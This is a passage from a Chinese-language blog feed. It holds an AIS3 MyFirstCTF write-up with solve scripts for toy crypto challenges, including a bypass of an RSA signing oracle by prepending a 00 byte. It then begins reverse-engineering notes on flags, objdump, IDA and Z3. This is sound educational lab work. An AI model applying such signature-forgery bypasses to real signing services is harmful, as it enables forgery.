keyword">for</span> j in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">:</span>            num <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span>padded<span class="token punctuation">[</span>i <span class="token operator">+</span> j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span>            num <span class="token operator">=</span> <span class="token punctuation">(</span>num <span class="token operator">+</span> keys<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span>            nums<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>num <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span>        result <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        result <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        result <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        result <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result  #len <span class="token operator">-</span><span class="token operator">></span> <span class="token number">40</span>name <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">strip</span><span class="token punctuation">(</span><span class="token punctuation">)</span>id <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string">"key = "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"result is:"</span><span class="token punctuation">,</span> <span class="token function">track</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">)</span> </code></pre>    </div></div><p>output： <code>=Js&amp;;*A``odZHi\'&gt;D=Js&amp;#i-DYf&gt;Uy\'yuyfyu&lt;)Gu</code></p><p>把 FLAG 每四個字就翻轉，接著加上 key 後 mod 96，再加上 32 後取字元值，就會得到 output<br>只要有 key 就可以用 result 逆推回 flag<br>由於我們知道 flag format = <code>AIS3{printable}</code>，因此利用<code>AIS3</code>就可以輕易逆推 key<br>4 個而已慢慢用手推即可</p><div class="spoiler collapsed">    <div class="spoiler-title">        推 key    </div>    <div class="spoiler-content">        <p>把 <code>result</code> 推回陣列(如下script)，取前四個數字(6,83,42,29)</p><pre class=" language-cpp"><code class="language-cpp"><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">=</span> <span class="token function">33</span><span class="token punctuation">(</span> <span class="token number">33</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span> <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">-</span><span class="token operator">></span> key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">69</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'I'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">=</span> <span class="token function">41</span><span class="token punctuation">(</span> <span class="token number">41</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span> <span class="token operator">=</span> <span class="token number">83</span> <span class="token operator">-</span><span class="token operator">></span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">42</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'S'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">=</span> <span class="token function">51</span><span class="token punctuation">(</span> <span class="token number">51</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span> <span class="token operator">=</span> <span class="token number">42</span> <span class="token operator">-</span><span class="token operator">></span> key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">87</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">=</span> <span class="token function">19</span><span class="token punctuation">(</span> <span class="token number">19</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span> <span class="token operator">=</span> <span class="token number">29</span> <span class="token operator">-</span><span class="token operator">></span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span>key<span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">}</span></code></pre>    </div></div><p>接著把 <code>result</code> 依據 key 逆推回去即可<br><strong>script</strong></p><pre class=" language-cpp"><code class="language-cpp">result <span class="token operator">=</span> <span class="token string">'=Js&amp;;*A`odZHi\'>D=Js&amp;#i-DYf>Uy\'yuyfyu&lt;)Gu'</span>n <span class="token operator">=</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token keyword">for</span> j in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>        n<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>i<span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token macro property">#n = [29, 42, 83, 6, 27, 10, 33, 64, 79, 68, 58, 40, 73, 7, 30, 36, 29, 42, 83, 6, 3, 73, 13, 36, 57, 70, 30, 53, 89, 7, 89, 85, 89, 70, 89, 85, 28, 9, 39, 85]</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>    n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token function">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token macro property">#n = [6, 83, 42, 29, 64, 33, 10, 27, 40, 58, 68, 79, 36, 30, 7, 73, 6, 83, 42, 29, 36, 13, 73, 3, 53, 30, 70, 57, 85, 89, 7, 89, 85, 89, 70, 89, 85, 39, 9, 28]</span>key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">-</span> key<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>執行 script 後得到<code>AIS3{w31c0me_t0_AIS3_cryptoO0O0o0Ooo0}22</code> 可以看到 padding 為 22</p><blockquote><p>flag <code>AIS3{w31c0me_t0_AIS3_cryptoO0O0o0Ooo0}</code></p></blockquote><h3 id="Judgement"><a href="#Judgement" class="headerlink" title="Judgement"></a>Judgement</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256<span class="token keyword">import</span> stringflag <span class="token operator">=</span> <span class="token string">'AIS3{THIS_IS_A_FAKE_FLAG}'</span>cand <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'_{}'</span>charset <span class="token operator">=</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">93</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>cand<span class="token punctuation">)</span>enc <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> c <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    <span class="token keyword">assert</span><span class="token punctuation">(</span>c <span class="token keyword">in</span> cand<span class="token punctuation">)</span>    enc  <span class="token operator">+=</span> charset<span class="token punctuation">[</span>int<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>c<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">%</span> len<span class="token punctuation">(</span>charset<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span></code></pre><p>output：<code>)g;Fk@&gt;2g;2V2J?d5G3_8V2&lt;dR2i5GZ@&lt;?2)g\j_2V&amp;?2;@[F@ek2_3"=k&amp;;2)\F2J9LL4g[W2"[2&lt;)RZ23@&lt;?2elFZ?2=@jZ23@=F2Yi52;lL5Vj2J?2J8\e@eW23e2lF330</code></p><p>很直覺的想法是把所有<code>cand</code>裡面的字元都跑一次+比對，但因為有多個字元會跑出同一個結果，所以我把每個結果的可能性都<code>print</code>出來用人工比對<br><strong>script</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256<span class="token keyword">import</span> stringenc <span class="token operator">=</span> <span class="token string">')g;Fk@>2g;2V2J?d5G3_8V2&lt;dR2i5GZ@&lt;?2)g\j_2V&amp;?2;@[F@ek2_3"=k&amp;;2)\F2J9LL4g[W2"[2&lt;)RZ23@&lt;?2elFZ?2=@jZ23@=F2Yi52;lL5Vj2J?2J8\e@eW23e2lF330'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> enc<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> cand<span class="token punctuation">:</span>        c <span class="token operator">=</span> charset<span class="token punctuation">[</span>int<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>j<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">%</span> len<span class="token punctuation">(</span>charset<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>第一個字元為題目的<code>enc</code> 後面的是可能的字元</p><div class="spoiler collapsed">    <div class="spoiler-title">        output    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token punctuation">)</span> A <span class="token number">8</span>g I<span class="token punctuation">;</span> SF v G <span class="token number">3</span>k x E <span class="token number">9</span> <span class="token punctuation">{</span>@ i<span class="token operator">></span> T X<span class="token number">2</span> _g I<span class="token punctuation">;</span> S<span class="token number">2</span> _V L M <span class="token number">4</span><span class="token number">2</span> _J B<span class="token operator">?</span> ed a<span class="token number">5</span> u ZG t <span class="token number">2</span><span class="token number">3</span> <span class="token number">1</span>_ q F H <span class="token number">5</span><span class="token number">8</span> UV L M <span class="token number">4</span><span class="token number">2</span> _<span class="token operator">&lt;</span> c d Kd aR y<span class="token number">2</span> _i <span class="token number">0</span><span class="token number">5</span> u ZG t <span class="token number">2</span>Z s@ i<span class="token operator">&lt;</span> c d K<span class="token operator">?</span> e<span class="token number">2</span> _<span class="token punctuation">)</span> A <span class="token number">8</span>g I\ rj D_ q F H <span class="token number">5</span><span class="token number">2</span> _V L M <span class="token number">4</span><span class="token operator">&amp;</span> R<span class="token operator">?</span> e<span class="token number">2</span> _<span class="token punctuation">;</span> S@ i<span class="token punctuation">[</span> NF v G <span class="token number">3</span>@ ie n <span class="token number">7</span>k x E <span class="token number">9</span> <span class="token punctuation">{</span><span class="token number">2</span> __ q F H <span class="token number">5</span><span class="token number">3</span> <span class="token number">1</span>" o<span class="token operator">=</span> k w Qk x E <span class="token number">9</span> <span class="token punctuation">{</span><span class="token operator">&amp;</span> R<span class="token punctuation">;</span> S<span class="token number">2</span> _<span class="token punctuation">)</span> A <span class="token number">8</span>\ rF v G <span class="token number">3</span><span class="token number">2</span> _J B<span class="token number">9</span> lL OL O<span class="token number">4</span> mg I<span class="token punctuation">[</span> NW <span class="token number">6</span><span class="token number">2</span> _" o<span class="token punctuation">[</span> N<span class="token number">2</span> _<span class="token operator">&lt;</span> c d K<span class="token punctuation">)</span> A <span class="token number">8</span>R yZ s<span class="token number">2</span> _<span class="token number">3</span> <span class="token number">1</span>@ i<span class="token operator">&lt;</span> c d K<span class="token operator">?</span> e<span class="token number">2</span> _e n <span class="token number">7</span>l hF v G <span class="token number">3</span>Z s<span class="token operator">?</span> e<span class="token number">2</span> _<span class="token operator">=</span> k w Q@ ij DZ s<span class="token number">2</span> _<span class="token number">3</span> <span class="token number">1</span>@ i<span class="token operator">=</span> k w QF v G <span class="token number">3</span><span class="token number">2</span> _Y Yi <span class="token number">0</span><span class="token number">5</span> u Z<span class="token number">2</span> _<span class="token punctuation">;</span> Sl hL O<span class="token number">5</span> u ZV L M <span class="token number">4</span>j D<span class="token number">2</span> _J B<span class="token operator">?</span> e<span class="token number">2</span> _J B<span class="token number">8</span> U\ re n <span class="token number">7</span>@ ie n <span class="token number">7</span>W <span class="token number">6</span><span class="token number">2</span> _<span class="token number">3</span> <span class="token number">1</span>e n <span class="token number">7</span><span class="token number">2</span> _l hF v G <span class="token number">3</span><span class="token number">3</span> <span class="token number">1</span><span class="token number">3</span> <span class="token number">1</span><span class="token number">0</span> <span class="token punctuation">}</span></code></pre>    </div></div><p>按照一般英文邏輯 + leet 語法去比對，但發現有幾個不太明確的，因此把已經推出來的丟到網路上便發現 flag 其實是來自<a href="https://www.youtube.com/watch?v=qu2tturKLLA/">sans undertale</a> <span class="github-emoji"><span>😂</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><div class="video-container"><iframe src="https://www.youtube.com/embed/qu2tturKLLA" frameborder="0" loading="lazy" allowfullscreen=""></iframe></div><blockquote><p>flag<br><code>AIS3{iT_IS_4_Beaut1FUL_day_0utside_8IrD5_4Re_SiNGin9_F1owERS_Ar3_BlOOmIN6_oN_dAys_1iKe_7h3se_</code><br><code>kiDs_1ik3_Y0u_ShOuLD_Be_BUrnin6_1n_h311}</code></p></blockquote><h3 id="ReSident-evil-villAge"><a href="#ReSident-evil-villAge" class="headerlink" title="ReSident evil villAge"></a>ReSident evil villAge</h3><blockquote><p>註：此題用了非正規解</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        題目 Source code如下    </div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socketserver<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> binascii <span class="token keyword">import</span> unhexlify<span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>BaseRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">recv</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>msg <span class="token operator">+</span> b<span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        privkey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        n <span class="token operator">=</span> privkey<span class="token punctuation">.</span>n        e <span class="token operator">=</span> privkey<span class="token punctuation">.</span>e        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'Welcome to ReSident evil villAge, sign the name "Ethan Winters" to get the flag.'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'n = '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'e = '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>b<span class="token string">'1) sign\n2) verify\n3) exit\n'</span><span class="token punctuation">)</span>            option <span class="token operator">=</span> self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> option <span class="token operator">==</span> b<span class="token string">'1'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>b<span class="token string">'Name (in hex): '</span><span class="token punctuation">)</span>                msg <span class="token operator">=</span> unhexlify<span class="token punctuation">(</span>self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> msg <span class="token operator">==</span> b<span class="token string">'Ethan Winters'</span> <span class="token operator">or</span> bytes_to_long<span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token operator">>=</span> n<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># msg+k*n not allowed</span>                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'Nice try!'</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    sig <span class="token operator">=</span> pow<span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">,</span> privkey<span class="token punctuation">.</span>d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># TODO: Apply hashing first to prevent forgery</span>                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'Signature: '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>sig<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> option <span class="token operator">==</span> b<span class="token string">'2'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>b<span class="token string">'Signature: '</span><span class="token punctuation">)</span>                sig <span class="token operator">=</span> int<span class="token punctuation">(</span>self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                verified <span class="token operator">=</span> <span class="token punctuation">(</span>pow<span class="token punctuation">(</span>sig<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">==</span> bytes_to_long<span class="token punctuation">(</span>b<span class="token string">'Ethan Winters'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> verified<span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'AIS3{THIS_IS_A_FAKE_FLAG}'</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'Well done!'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">break</span><span class="token keyword">class</span> <span class="token class-name">ForkingServer</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>ForkingTCPServer<span class="token punctuation">,</span> socketserver<span class="token punctuation">.</span>TCPServer<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    HOST<span class="token punctuation">,</span> PORT <span class="token operator">=</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">42069</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>    server <span class="token operator">=</span> ForkingServer<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">,</span> Task<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>allow_reuse_address <span class="token operator">=</span> <span class="token boolean">True</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>    </div></div><p>題目是 RSA 簽證，目標是把 signature 送進去以達到 <code>pow(sig, e, n) == bytes_to_long(b'Ethan Winters')</code><br>原則上只要把 Ethan Winters 轉成 hex 丟進去讓它跑出 signature 之後，再丟回去讓他 verify 就可以了。<br>但是從 <code>if msg == b'Ethan Winters' or bytes_to_long(msg) &gt;= n:  # msg+k*n not allowed</code> 這行可以看到 <code>check msg == Ethan Winters</code> 會被擋掉。<br>由於送進去的是字串，於是要讓<strong>數字不變但是字串改變</strong>，就去嘗試 Bypass，發現前面加上 <code>00</code> 可以繞過，所以傳 <code>00</code> 加上 <code>Ethan Winters</code> 轉成 <code>hex</code> 就可以了<br>直接上圖。<br><img src="https://i.imgur.com/Kwxy3WU.png"><br><img src="https://i.imgur.com/4dpX7qf.png"></p><h2 id="Epilogue"><a href="#Epilogue" class="headerlink" title="Epilogue"></a>Epilogue</h2><p>記得在早上的時候可能是太緊張，好像只解出一兩題(?)左右<br>一開始就看到有一題 RSA，因為前幾天一直在 CryptoHack 練 RSA 然後又有兩個人很快就解了就果斷看那題，然後就看了爆炸久，大概在一個半小時的時候就很崩潰，因為大家的分數都蹭蹭蹭的上去(賽前一周有專門陪我練的學長，所以有種要考好的壓力(#))<br>後來吃完午餐冷靜下來之後解題就比較順利了<br>真的是親身體會比賽緊張會影響發揮這句話~~~<br>有任何問題歡迎和我討論~~</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> MyFirstCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 SCIST Security Reverse Note</title>
      <link href="/2021/04/10/2021-SCIST-Security-Reverse-Note/"/>
      <url>/2021/04/10/2021-SCIST-Security-Reverse-Note/</url>
      
        <content type="html"><![CDATA[<p><code>python3 -i [file]</code>跑完進入到 REPL mode</p><h2 id="Flags"><a href="#Flags" class="headerlink" title="Flags"></a>Flags</h2><ul><li>CF(Carry Flag) : Set if an aritmnetic <strong>carry</strong> or <strong>borrow</strong> has indicated,reset otherwise</li><li>ZF (Zero Flag) : Set if an arithmetic result is <strong>0</strong>, reset otherwise</li><li>SF (Sign Flag) : Set if the result is <strong>negative</strong> (MSB = 1)</li><li>OF(Overflow Flag) : Set if an arithmetic overflow has occurred, reset otherwise<h3 id="Practice"><a href="#Practice" class="headerlink" title="Practice"></a>Practice</h3><table><thead><tr><th>Expression</th><th>CF</th><th>ZF</th><th>SF</th><th>OF</th></tr></thead><tbody><tr><td>1. 1010 - 1010</td><td>0</td><td>1</td><td>0</td><td>0</td></tr><tr><td>2. 0000 - 0001</td><td>1</td><td>0</td><td>1</td><td>0</td></tr><tr><td>3. 1110 + 1110</td><td>1</td><td>0</td><td>1</td><td>1</td></tr></tbody></table></li></ul><h2 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h2><pre class=" language-bash"><code class="language-bash">$ objdump -M intel -d <span class="token operator">&lt;</span>binary<span class="token operator">></span></code></pre><h2 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h2><pre class=" language-bash"><code class="language-bash">$ vim hello.c$ gcc hello.c <span class="token punctuation">(</span>filename <span class="token variable"><span class="token variable">`</span>a.out<span class="token variable">`</span></span> by default<span class="token punctuation">)</span>$ <span class="token function">file</span> hello.c$ ./a.out</code></pre><h2 id="common-commands"><a href="#common-commands" class="headerlink" title="common commands"></a>common commands</h2><pre class=" language-bash"><code class="language-bash">strings<span class="token function">strace</span><span class="token function">grep</span></code></pre><h2 id="IDA-Pro"><a href="#IDA-Pro" class="headerlink" title="IDA Pro"></a>IDA Pro</h2><pre class=" language-bash"><code class="language-bash">F5 -<span class="token operator">></span> pseudocode<span class="token function">shift</span> + F12 -<span class="token operator">></span> Strings window</code></pre><h2 id="Z3"><a href="#Z3" class="headerlink" title="Z3"></a>Z3</h2><h3 id="Variable-type"><a href="#Variable-type" class="headerlink" title="Variable type"></a>Variable type</h3><pre class=" language-bash"><code class="language-bash">Int <span class="token keyword">:</span> ℤReal <span class="token keyword">:</span> ℝBool <span class="token keyword">:</span> booleanBitVec <span class="token keyword">:</span> Bit Vector, provide variable-length integer</code></pre><p>Bool(‘t’) define t as a boolean variable<br>BitVec(‘x’,32) define x as a 32bit data</p><h3 id="Variable"><a href="#Variable" class="headerlink" title="Variable"></a>Variable</h3><pre class=" language-py"><code class="language-py">x = Int('x')y = [Int(f'x_{i}') for i in range (30)]</code></pre><h3 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h3><ul><li>SAT - results are in <code>s.model()</code></li><li>UNSAT - use <code>reason_unknown()</code> to get the reason</li></ul><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><pre class=" 